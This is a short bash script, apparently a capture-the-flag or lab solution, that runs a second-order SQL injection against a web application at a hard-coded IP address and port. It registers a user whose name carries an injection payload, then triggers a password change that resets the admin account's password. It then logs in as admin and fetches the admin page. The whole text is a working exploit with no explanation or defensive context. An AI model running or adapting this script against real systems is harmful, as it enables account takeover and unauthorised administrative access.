#!/bin/bash

TARGET="http://47.120.47.61:32994/"
EVIL_USER="pwn' OR username='admin'/*"
OLD_PASS="oldpass123"
NEW_PASS="NewPass123456"
COOKIE="cookie.txt"
ADMIN_COOKIE="admin_cookie.txt"

echo "[1] Register evil user..."
curl -s -X POST "$TARGET/register.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=$EVIL_USER" \
  --data-urlencode "password=$OLD_PASS"

echo
echo "[2] Login as evil user..."
curl -s -c "$COOKIE" -X POST "$TARGET/login.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=$EVIL_USER" \
  --data-urlencode "password=$OLD_PASS"

echo
echo "[3] Trigger second-order SQL injection via change password..."
curl -s -b "$COOKIE" -X POST "$TARGET/change.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "newpass=$NEW_PASS"

echo
echo "[4] Login as admin with changed password..."
curl -s -c "$ADMIN_COOKIE" -X POST "$TARGET/login.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=$NEW_PASS"

echo
echo "[5] Fetch admin page..."
curl -s -b "$ADMIN_COOKIE" "$TARGET/admin.php"

echo